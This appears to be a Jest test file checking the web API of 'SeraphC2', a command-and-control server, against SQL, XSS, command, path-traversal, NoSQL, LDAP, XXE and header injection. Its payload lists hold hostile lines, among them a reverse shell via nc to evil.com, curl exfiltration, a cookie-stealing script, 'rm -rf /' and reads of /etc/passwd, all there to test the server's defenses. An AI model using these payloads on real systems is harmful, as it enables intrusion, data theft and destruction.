/**
 * Input Validation and Injection Security Tests for SeraphC2
 * Tests for SQL injection, XSS, command injection, and other input validation vulnerabilities
 */

import request from 'supertest';
import { Application } from 'express';
import { SeraphC2Server, ServerConfig } from '../../src/web/server';
import { PostgresOperatorRepository } from '../../src/core/repositories/operator.repository';
import { initializeDatabase } from '../../src/core/database';
import { JwtUtils } from '../../src/core/auth/jwt.utils';
import { OperatorRole } from '../../src/types/entities';

describe('Input Validation and Injection Security Tests', () => {
  let app: Application;
  let server: SeraphC2Server;
  let adminToken: string;
  let operatorToken: string;

  beforeAll(async () => {
    // Initialize test database
    await initializeDatabase();

    // Setup test server
    const operatorRepository = new PostgresOperatorRepository();
    const serverConfig: ServerConfig = {
      port: 3004,
      host: 'localhost',
      corsOrigins: ['http://localhost:3004'],
      enableRequestLogging: false,
    };

    server = new SeraphC2Server(serverConfig, operatorRepository);
    await server.start();
    app = server.getApp();

    // Setup test tokens
    adminToken = JwtUtils.generateAccessToken('admin-id', 'testadmin', OperatorRole.ADMINISTRATOR);
    operatorToken = JwtUtils.generateAccessToken(
      'operator-id',
      'testoperator',
      OperatorRole.OPERATOR
    );
  }, 30000);

  afterAll(async () => {
    if (server) {
      await server.stop();
    }
  }, 10000);

  describe('SQL Injection Tests', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE operators; --",
      "' OR '1'='1",
      "' OR 1=1 --",
      "' UNION SELECT * FROM operators --",
      "'; INSERT INTO operators (username) VALUES ('hacker'); --",
      "' OR 1=1; UPDATE operators SET role='administrator' WHERE username='testuser'; --",
      "1' OR '1'='1' /*",
      "' OR 'x'='x",
      "'; EXEC xp_cmdshell('dir'); --",
      "' AND (SELECT COUNT(*) FROM operators) > 0 --",
    ];

    test('should prevent SQL injection in login username field', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app).post('/api/auth/login').send({
          username: payload,
          password: 'password',
        });

        // Should not cause server error or unauthorized access
        expect(response.status).not.toBe(500);
        expect(response.body.success).toBe(false);

        // Should not return sensitive information
        if (response.body.error) {
          expect(response.body.error).not.toContain('SQL');
          expect(response.body.error).not.toContain('database');
          expect(response.body.error).not.toContain('table');
        }
      }
    });

    test('should prevent SQL injection in operator search', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/operators')
          .query({ search: payload })
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).not.toBe(500);

        // Should not return all operators due to injection
        if (response.status === 200) {
          expect(Array.isArray(response.body.data)).toBe(true);
        }
      }
    });

    test('should prevent SQL injection in implant queries', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/implants')
          .query({
            hostname: payload,
            username: payload,
            os: payload,
          })
          .set('Authorization', `Bearer ${operatorToken}`);

        expect(response.status).not.toBe(500);
      }
    });

    test('should prevent SQL injection in task creation', async () => {
      for (const payload of sqlInjectionPayloads) {
        const response = await request(app)
          .post('/api/implants/test-implant-id/tasks')
          .set('Authorization', `Bearer ${operatorToken}`)
          .send({
            command: payload,
            arguments: [payload],
            metadata: { description: payload },
          });

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Cross-Site Scripting (XSS) Tests', () => {
    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<div onclick="alert(\'XSS\')">Click me</div>',
      '"><script>alert("XSS")</script>',
      '\';alert("XSS");//',
      '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
    ];

    test('should sanitize XSS in operator creation', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/operators')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            username: `user${Math.random()}`,
            email: 'test@example.com',
            password: 'SecurePassword123!',
            role: 'operator',
            displayName: payload,
          });

        // Should either reject the input or sanitize it
        if (response.status === 201) {
          expect(response.body.data?.displayName).not.toContain('<script>');
          expect(response.body.data?.displayName).not.toContain('javascript:');
          expect(response.body.data?.displayName).not.toContain('onerror=');
        }
      }
    });

    test('should sanitize XSS in task descriptions', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/implants/test-implant-id/tasks')
          .set('Authorization', `Bearer ${operatorToken}`)
          .send({
            command: 'test',
            arguments: [],
            metadata: {
              description: payload,
              notes: payload,
            },
          });

        if (response.status === 201) {
          expect(response.body.data?.metadata?.description).not.toContain('<script>');
          expect(response.body.data?.metadata?.notes).not.toContain('<script>');
        }
      }
    });

    test('should sanitize XSS in file upload metadata', async () => {
      for (const payload of xssPayloads) {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${operatorToken}`)
          .field('description', payload)
          .field('tags', payload)
          .attach('file', Buffer.from('test content'), 'test.txt');

        if (response.status === 201) {
          expect(response.body.data?.description).not.toContain('<script>');
          expect(response.body.data?.tags).not.toContain('<script>');
        }
      }
    });
  });

  describe('Command Injection Tests', () => {
    const commandInjectionPayloads = [
      '; ls -la',
      '&& cat /etc/passwd',
      '| whoami',
      '`id`',
      '$(whoami)',
      '; rm -rf /',
      '&& curl http://evil.com/exfiltrate',
      '| nc -e /bin/sh evil.com 4444',
      '; python -c "import os; os.system(\'id\')"',
      '&& powershell.exe -Command "Get-Process"',
    ];

    test('should prevent command injection in task execution', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/implants/test-implant-id/tasks')
          .set('Authorization', `Bearer ${operatorToken}`)
          .send({
            command: 'shell',
            arguments: [payload],
          });

        // Should validate and sanitize command arguments
        expect(response.status).not.toBe(500);

        // Should not execute arbitrary commands on server
        if (response.status === 201) {
          // Verify the command is properly escaped/validated
          expect(response.body.data?.arguments).toBeDefined();
        }
      }
    });

    test('should prevent command injection in file operations', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/implants/test-implant-id/tasks')
          .set('Authorization', `Bearer ${operatorToken}`)
          .send({
            command: 'download',
            arguments: [payload],
          });

        expect(response.status).not.toBe(500);
      }
    });

    test('should prevent command injection in module execution', async () => {
      for (const payload of commandInjectionPayloads) {
        const response = await request(app)
          .post('/api/modules/execute')
          .set('Authorization', `Bearer ${operatorToken}`)
          .send({
            moduleName: 'test-module',
            parameters: {
              command: payload,
              path: payload,
            },
          });

        expect(response.status).not.toBe(500);
      }
    });
  });

  describe('Path Traversal Tests', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '/var/www/../../etc/passwd',
      'C:\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
    ];

    test('should prevent path traversal in file downloads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get('/api/files/download')
          .query({ path: payload })
          .set('Authorization', `Bearer ${operatorToken}`);

        // Should not allow access to system files
        expect(response.status).not.toBe(200);

        if (response.status === 400) {
          expect(response.body.error).toContain('Invalid');
        }
      }
    });

    test('should prevent path traversal in file uploads', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .post('/api/files/upload')
          .set('Authorization', `Bearer ${operatorToken}`)
          .field('path', payload)
          .attach('file', Buffer.from('test content'), 'test.txt');

        // Should reject or sanitize the path
        expect(response.status).not.toBe(500);
      }
    });

    test('should prevent path traversal in log file access', async () => {
      for (const payload of pathTraversalPayloads) {
        const response = await request(app)
          .get('/api/logs')
          .query({ file: payload })
          .set('Authorization', `Bearer ${adminToken}`);

        expect(response.status).not.toBe(500);

        // Should not return system files
        if (response.status === 200) {
          expect(response.body.data).not.toContain('root:');
          expect(response.body.data).not.toContain('Administrator:');
        }
      }
    });
  });

  describe('NoSQL Injection Tests', () => {
    const nosqlInjectionPayloads = [
      { $ne: null },
      { $gt: '' },
      { $regex: '.*' },
      { $where: 'this.username == this.password' },
      { $or: [{ username: 'admin' }, { role: 'administrator' }] },
      '{"$ne": null}',
      '{"$gt": ""}',
      '{"username": {"$ne": null}}',
    ];

    test('should prevent NoSQL injection in search queries', async () => {
      for (const payload of nosqlInjectionPayloads) {
        const response = await request(app)
          .get('/api/implants')
          .query({ filter: JSON.stringify(payload) })
          .set('Authorization', `Bearer ${operatorToken}`);

        expect(response.status).not.toBe(500);

        // Should not return unauthorized data
        if (response.status === 200) {
          expect(Array.isArray(response.body.data)).toBe(true);
        }
      }
    });
  });

  describe('LDAP Injection Tests', () => {
    const ldapInjectionPayloads = [
      '*)(uid=*',
      '*)(|(uid=*',
      '*)(&(uid=*',
      '*))%00',
      '*()|%26',
      '*)(objectClass=*',
      '*))(|(uid=*',
    ];

    test('should prevent LDAP injection in user authentication', async () => {
      for (const payload of ldapInjectionPayloads) {
        const response = await request(app).post('/api/auth/login').send({
          username: payload,
          password: 'password',
        });

        expect(response.status).not.toBe(500);
        expect(response.body.success).toBe(false);
      }
    });
  });

  describe('XML/XXE Injection Tests', () => {
    const xxePayloads = [
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">%remote;]><root/>',
    ];

    test('should prevent XXE attacks in XML processing', async () => {
      for (const payload of xxePayloads) {
        const response = await request(app)
          .post('/api/import/xml')
          .set('Authorization', `Bearer ${adminToken}`)
          .set('Content-Type', 'application/xml')
          .send(payload);

        // Should reject malicious XML or process safely
        expect(response.status).not.toBe(500);

        if (response.status === 200) {
          // Should not contain file contents
          expect(response.body.data).not.toContain('root:');
          expect(response.body.data).not.toContain('localhost');
        }
      }
    });
  });

  describe('Header Injection Tests', () => {
    const headerInjectionPayloads = [
      'test\r\nX-Injected: true',
      'test\nSet-Cookie: admin=true',
      'test\r\n\r\n<script>alert("XSS")</script>',
      'test%0d%0aX-Injected:%20true',
      'test%0aSet-Cookie:%20admin=true',
    ];

    test('should prevent HTTP header injection', async () => {
      for (const payload of headerInjectionPayloads) {
        const response = await request(app)
          .get('/api/health')
          .set('X-Custom-Header', payload)
          .set('Authorization', `Bearer ${operatorToken}`);

        // Should not reflect injected headers
        expect(response.headers['x-injected']).toBeUndefined();
        expect(response.headers['set-cookie']).not.toContain('admin=true');
      }
    });
  });

  describe('Input Length and Format Validation', () => {
    test('should reject excessively long inputs', async () => {
      const longString = 'A'.repeat(10000);

      const response = await request(app)
        .post('/api/operators')
        .set('Authorization', `Bearer ${adminToken}`)
        .send({
          username: longString,
          email: 'test@example.com',
          password: 'SecurePassword123!',
          role: 'operator',
        });

      expect(response.status).toBe(400);
      expect(response.body.error).toContain('length');
    });

    test('should validate email format', async () => {
      const invalidEmails = [
        'invalid-email',
        '@example.com',
        'test@',
        'test..test@example.com',
        'test@example',
        '<script>alert("xss")</script>@example.com',
      ];

      for (const email of invalidEmails) {
        const response = await request(app)
          .post('/api/operators')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            username: `user${Math.random()}`,
            email,
            password: 'SecurePassword123!',
            role: 'operator',
          });

        expect(response.status).toBe(400);
        expect(response.body.error).toContain('email');
      }
    });

    test('should validate username format', async () => {
      const invalidUsernames = [
        '',
        'a',
        'user with spaces',
        'user@domain.com',
        '<script>alert("xss")</script>',
        'user\nname',
        'user\tname',
      ];

      for (const username of invalidUsernames) {
        const response = await request(app)
          .post('/api/operators')
          .set('Authorization', `Bearer ${adminToken}`)
          .send({
            username,
            email: 'test@example.com',
            password: 'SecurePassword123!',
            role: 'operator',
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Content Type Validation', () => {
    test('should validate JSON content type', async () => {
      const response = await request(app)
        .post('/api/operators')
        .set('Authorization', `Bearer ${adminToken}`)
        .set('Content-Type', 'text/plain')
        .send('username=test&password=test');

      expect(response.status).toBe(400);
    });

    test('should reject unexpected content types', async () => {
      const maliciousContentTypes = [
        'application/x-www-form-urlencoded; charset=utf-7',
        'text/html',
        'application/javascript',
        'text/xml',
      ];

      for (const contentType of maliciousContentTypes) {
        const response = await request(app)
          .post('/api/operators')
          .set('Authorization', `Bearer ${adminToken}`)
          .set('Content-Type', contentType)
          .send('{"username":"test"}');

        expect(response.status).toBeGreaterThanOrEqual(400);
      }
    });
  });
});
